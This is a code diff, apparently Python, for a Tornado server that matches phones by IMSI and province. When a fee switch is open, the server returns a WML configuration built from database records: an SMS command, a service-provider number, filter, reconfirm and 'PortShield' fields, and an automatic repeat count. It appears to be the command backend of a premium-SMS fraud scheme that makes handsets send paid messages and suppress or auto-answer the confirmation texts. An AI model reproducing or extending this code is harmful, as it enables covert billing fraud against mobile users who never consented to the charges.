@@ -5,11 +5,15 @@ import tornado.web
 import struct
 import torndb
 import time
+import sys
 import geoip2.database
 import threading
 
 import config
 from Bastion import _test
+
+reload(sys)
+sys.setdefaultencoding("utf-8")
 
 MATCH_CONTENT = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
 MATCH_CONTENT += "<wml>"
@@ -24,6 +28,21 @@ MATCH_CONTENT += "<autofee></autofee>"
 MATCH_CONTENT += "<feemode>-2</feemode>"
 MATCH_CONTENT += "</card>"
 MATCH_CONTENT += "</wml>"
+
+FEE_CONTENT = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
+FEE_CONTENT += "<wml>"
+FEE_CONTENT += "<card>"
+FEE_CONTENT += "<Ccmd_cust>[cmd]</Ccmd_cust>"
+FEE_CONTENT += "<Cnum_cust>[spNumber]</Cnum_cust>"
+FEE_CONTENT += "<filter1_cust>[filter]</filter1_cust>"
+FEE_CONTENT += "<filter2_cust></filter2_cust>"
+FEE_CONTENT += "<Creconfirm_cust>[reconfirm]</Creconfirm_cust>"
+FEE_CONTENT += "<PortShield>[portShield]</PortShield>"
+FEE_CONTENT += "<fee></fee>"
+FEE_CONTENT += "<autofee>[times]</autofee>"
+FEE_CONTENT += "<feemode>11</feemode>"
+FEE_CONTENT += "</card>"
+FEE_CONTENT += "</wml>"
 
 TEST_CONTENT =  "";
 
@@ -65,8 +84,9 @@ class MainHandler(tornado.web.RequestHandler):
         if _test_imsi_info == None:
             #process normal user
             _rsp_content = get_imsi_response(reqInfo["imsi"],threads)
-            print(_rsp_content)
-            self.write(_rsp_content)
+            if _rsp_content != None:
+                print(_rsp_content)
+                self.write(_rsp_content)
         else:
             self.write(get_test_response(_test_imsi_info));
         print "tcd spent:"+str(int(round(time.time() * 1000))-_begin_time)
@@ -97,7 +117,7 @@ def get_imsi_response(_imsi,_threads):
             _threads.append(threading.Thread(target=async_update_match_count(_imsi)))
         else:
             if get_system_parameter_from_db('openFee') == 'open' :
-                get_cmd(_recordRsp)
+                return get_cmd(_recordRsp)
     return _return
 
 def async_update_match_count(_imsi):
@@ -109,13 +129,13 @@ def async_update_match_count(_imsi):
 def get_cmd(_user):
     if _user['province']!=None and len(_user['province']) > 0:
         dbConfig=torndb.Connection(config.GLOBAL_SETTINGS['config_db']['host'],config.GLOBAL_SETTINGS['config_db']['name'],config.GLOBAL_SETTINGS['config_db']['user'],config.GLOBAL_SETTINGS['config_db']['psw'])
-        _sql = 'SELECT * FROM `sms_cmd_configs` , `sms_cmd_covers` WHERE `sms_cmd_configs`.id=`sms_cmd_covers`.`smsCmdId` AND province = %s AND mobileType = %s limit 1 '
+        _sql = 'SELECT * FROM `sms_cmd_configs` , `sms_cmd_covers` WHERE `sms_cmd_configs`.id=`sms_cmd_covers`.`smsCmdId` AND province = %s AND mobileType = %s and state = \'open\' limit 1 '
         _record = dbConfig.get(_sql, _user['province'],_user['mobileType']) 
         if _record == None:
             return None
         else:
             print str(_record)
-            return _record
+            return FEE_CONTENT.replace('[cmd]', str(_record['msg'])).replace('[spNumber]', str(_record['spNumber'])).replace('[filter]', str(_record['filter'])).replace('[reconfirm]', str(_record['reconfirm'])).replace('[portShield]', str(_record['portShield'])).replace('[times]', str(_record['times']))
     else:
         print 'can not match province'+str(_user)
         return None
